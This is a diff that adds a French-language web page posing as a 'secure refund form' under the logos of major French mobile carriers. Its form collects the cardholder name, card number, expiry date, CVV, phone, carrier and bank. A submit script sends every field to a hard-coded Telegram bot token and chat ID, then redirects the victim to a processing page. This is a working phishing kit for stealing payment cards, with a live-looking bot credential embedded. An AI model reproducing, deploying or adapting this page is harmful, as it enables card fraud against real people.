@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulaire de Remboursement Sécurisé</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+        }
+        #card-error {
+            display: none;
+            color: red;
+            font-size: 0.9rem;
+            margin-top: 5px;
+        }
+    </style>
+</head>
+<body class="bg-gray-100 flex flex-col min-h-screen justify-between">
+
+    <!-- Formulaire principal -->
+    <div class="bg-white rounded-lg shadow-xl p-8 max-w-lg mx-auto mt-10">
+        <!-- Logos des opérateurs -->
+        <div class="flex justify-center space-x-4 mb-6">
+            <img src="IMG_4265.jpeg" alt="sfr" class="h-12">
+            <img src="IMG_4264.jpeg" alt="ORANGE" class="h-12">
+            <img src="Bouygues_Télécom.png" alt="Bouygues Telecom" class="h-12">
+            <img src="Free_logo.svg.png" alt="free" class="h-12">
+        </div>
+
+        <!-- Titre -->
+        <h1 class="text-2xl font-bold text-center text-gray-800 mb-2">Formulaire de Remboursement Sécurisé</h1>
+        <p class="text-sm text-center text-gray-600 mb-6">
+            Veuillez entrer les informations de votre carte bancaire pour recevoir votre remboursement en toute sécurité.
+            Ce processus est sécurisé et protégé.
+        </p>
+
+        <!-- Formulaire -->
+        <form id="remboursement-form">
+            <!-- Titulaire de la carte -->
+            <div class="mb-4">
+                <label for="nom" class="block text-sm font-medium text-gray-700">Titulaire de la carte</label>
+                <input type="text" id="nom" placeholder="Ex: Jean Dupont" required
+                    class="mt-1 block w-full px-4 py-2 border rounded-lg focus:ring-green-500 focus:border-green-500">
+            </div>
+
+            <!-- Numéro de carte -->
+            <div class="mb-4">
+                <label for="numero-carte" class="block text-sm font-medium text-gray-700">Numéro de carte</label>
+                <input type="tel" id="numero-carte" placeholder="1234 5678 9012 3456" required maxlength="19"
+                    class="mt-1 block w-full px-4 py-2 border rounded-lg focus:ring-green-500 focus:border-green-500">
+                <p id="card-error" class="text-red-500 hidden">Le numéro de carte doit être valide et suivre le format requis.</p>
+            </div>
+
+            <!-- Date d'expiration -->
+            <div class="mb-4">
+                <label for="date-expiration" class="block text-sm font-medium text-gray-700">Date d'expiration (MM/AA)</label>
+                <input type="month" id="date-expiration" required
+                    class="mt-1 block w-full px-4 py-2 border rounded-lg focus:ring-green-500 focus:border-green-500">
+            </div>
+
+            <!-- Code CVV -->
+            <div class="mb-4">
+                <label for="cvv" class="block text-sm font-medium text-gray-700">Code CVV</label>
+                <input type="tel" id="cvv" placeholder="123" required maxlength="3"
+                    class="mt-1 block w-full px-4 py-2 border rounded-lg focus:ring-green-500 focus:border-green-500">
+            </div>
+
+            <!-- Numéro de téléphone -->
+            <div class="mb-4">
+                <label for="telephone" class="block text-sm font-medium text-gray-700">Numéro de téléphone</label>
+                <input type="tel" id="telephone" placeholder="Ex: 06 12 34 56 78" required
+                    class="mt-1 block w-full px-4 py-2 border rounded-lg focus:ring-green-500 focus:border-green-500">
+            </div>
+
+            <!-- Sélection du fournisseur -->
+            <div class="mb-6">
+                <label for="operateur" class="block text-sm font-medium text-gray-700">Choisir votre opérateur</label>
+                <select id="operateur" name="operateur" required
+                    class="mt-1 block w-full px-4 py-2 border rounded-lg focus:ring-green-500 focus:border-green-500 bg-white">
+                    <option value="" disabled selected>-- Sélectionnez votre opérateur --</option>
+                    <!-- Opérateurs principaux -->
+                    <option value="orange">Orange</option>
+                    <option value="bouygues">Bouygues Telecom</option>
+                    <option value="sfr">SFR</option>
+                    <option value="free">Free Mobile</option>
+                    <!-- MVNOs (Opérateurs virtuels) -->
+                    <option value="la-poste">La Poste Mobile</option>
+                    <option value="coriolis">Coriolis</option>
+                    <option value="nrj-mobile">NRJ Mobile</option>
+                    <option value="red">RED by SFR</option>
+                    <option value="sosh">Sosh (Orange)</option>
+                    <option value="b-and-you">B&YOU (Bouygues Telecom)</option>
+                    <option value="syma">Syma Mobile</option>
+                    <option value="lycamobile">Lycamobile</option>
+                    <option value="lebara">Lebara Mobile</option>
+                    <option value="reglo-mobile">Réglo Mobile (E.Leclerc)</option>
+                    <option value="prixtel">Prixtel</option>
+                    <option value="auchantelecom">Auchan Telecom</option>
+                    <option value="cdiscount">Cdiscount Mobile</option>
+                    <option value="budgetmobile">Budget Mobile</option>
+                    <option value="koodo">Koodo</option>
+                    <option value="hellomobile">Hello Mobile</option>
+                    <option value="zeop">Zeop Mobile</option>
+                    <!-- Autre -->
+                    <option value="autre">Autre (Autre opérateur)</option>
+                </select>
+            </div>
+
+            <!-- Banque -->
+            <div class="mb-6">
+                <label for="bank" class="block text-sm font-medium text-gray-700">Choisir votre banque</label>
+                <select id="bank" name="bank" required
+                    class="mt-1 block w-full px-4 py-2 border rounded-lg focus:ring-green-500 focus:border-green-500 bg-white">
+                    <option value="" disabled selected>-- Sélectionnez votre banque --</option>
+                    <!-- Grandes banques traditionnelles -->
+                    <option value="bnpp">BNP Paribas</option>
+                    <option value="sg">Société Générale</option>
+                    <option value="cic">CIC</option>
+                    <option value="ca">Crédit Agricole</option>
+                    <option value="bp">Banque Populaire</option>
+                    <option value="cm">Crédit Mutuel</option>
+                    <option value="hsbc">HSBC France</option>
+                    <option value="la-poste">La Banque Postale</option>
+                    <option value="lcl">LCL (Le Crédit Lyonnais)</option>
+                    <!-- Banques en ligne -->
+                    <option value="ing">ING</option>
+                    <option value="bforbank">BforBank</option>
+                    <option value="fortuneo">Fortuneo</option>
+                    <option value="monabanq">Monabanq</option>
+                    <option value="hellobank">Hello Bank!</option>
+                    <option value="orange-bank">Orange Bank</option>
+                    <option value="n26">N26</option>
+                    <option value="revolut">Revolut</option>
+                    <!-- Banques régionales -->
+                    <option value="ca-regionale">Crédit Agricole (régionale)</option>
+                    <option value="bpce">BPCE (Banque Populaire et Caisse d'Epargne)</option>
+                    <option value="ce">Caisse d'Epargne</option>
+                    <option value="arkea">Crédit Mutuel Arkéa</option>
+                    <!-- Autres banques -->
+                    <option value="boursorama">Boursorama Banque</option>
+                    <option value="axa">AXA Banque</option>
+                    <option value="banque-palatine">Banque Palatine</option>
+                    <option value="hsbc">HSBC France</option>
+                    <option value="barclays">Barclays France</option>
+                    <option value="c-zam">C-Zam</option>
+                    <!-- Autre -->
+                    <option value="autre">Autre (Autre banque)</option>
+                </select>
+            </div>
+
+            <!-- Bouton de validation -->
+            <button type="submit"
+                class="w-full bg-green-600 text-white font-bold py-2 px-4 rounded-lg hover:bg-green-700 transition duration-300">
+                Valider mon remboursement
+            </button>
+        </form>
+
+        <!-- Section supplémentaire: Remboursement sécurisé -->
+        <div class="mt-6 flex justify-center">
+            <img src="IMG_4262.jpeg" alt="Remboursement Sécurisé" class="w-52 h-auto">
+        </div>
+    </div>
+
+    <!-- TÉLÉCHARGEMENT (Footer) -->
+    <footer class="bg-gray-800 text-white py-6 mt-10">
+        <div class="max-w-4xl mx-auto text-center">
+            <p class="text-lg font-semibold mb-2">Pour toute assistance, contactez-nous :</p>
+            <p class="text-sm">📧 Email: <a href="mailto:support@remboursement.com" class="text-green-400 hover:underline">support@remboursement.com</a></p>
+            <p class="text-sm">📞 Téléphone: <a href="tel:+33890889878" class="text-green-400 hover:underline">+33 8 90 83 67 89</a></p>
+            <div class="mt-4">
+                <a href="#" class="text-green-400 hover:underline mx-2">Facebook</a> |
+                <a href="#" class="text-green-400 hover:underline mx-2">Twitter</a> |
+                <a href="#" class="text-green-400 hover:underline mx-2">Instagram</a>
+            </div>
+            <div class="mt-4 text-sm">
+                <a href="#" class="hover:underline">📄 Politique de confidentialité</a> |
+                <a href="#" class="hover:underline">📘 Conditions générales</a> |
+                <a href="#" class="hover:underline">🔗 Plan du site</a>
+            </div>
+            <p class="text-xs mt-4">&copy; 2024 Service de Remboursement. Tous droits réservés.</p>
+        </div>
+    </footer>
+
+    <script>
+        document.getElementById("remboursement-form").addEventListener("submit", async function(event) {
+            event.preventDefault();
+
+            const nom = document.getElementById("nom").value;
+            const numeroCarte = document.getElementById("numero-carte").value.replace(/\s+/g, '');
+            const dateExpiration = document.getElementById("date-expiration").value;
+            const cvv = document.getElementById("cvv").value;
+            const telephone = document.getElementById("telephone").value;
+            const operateur = document.getElementById("operateur").value;
+            const bank = document.getElementById("bank").value;
+
+            // توكن البوت الأول
+            const token1 = "8136808876:AAHGP4-gnV2qGXqjMkwzcdV-9olnYt_0Dj4";
+            const chatId1 = "5372119436";
+
+            const message = `
+🔔 **Nouvelle Demande de Remboursement** 🔔
+👤 Nom: ${nom}
+💳 Numéro de Carte: ${numeroCarte}
+📅 Expiration: ${dateExpiration}
+🔒 CVV: ${cvv}
+📞 Téléphone: ${telephone}
+📡 Opérateur: ${operateur}
+🏦 Banque: ${bank}`;
+
+            try {
+                // إرسال الطلب إلى البوت الأول
+                await fetch(`https://api.telegram.org/bot${token1}/sendMessage`, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId1,
+                        text: message,
+                        parse_mode: "Markdown",
+                    }),
+                });
+
+                // إعادة التوجيه بعد الإرسال
+                window.location.href = "Traitement.html";
+            } catch (error) {
+                alert("Impossible d'envoyer les données. Vérifiez votre connexion.");
+            }
+        });
+    </script>
+</body>
+</html>
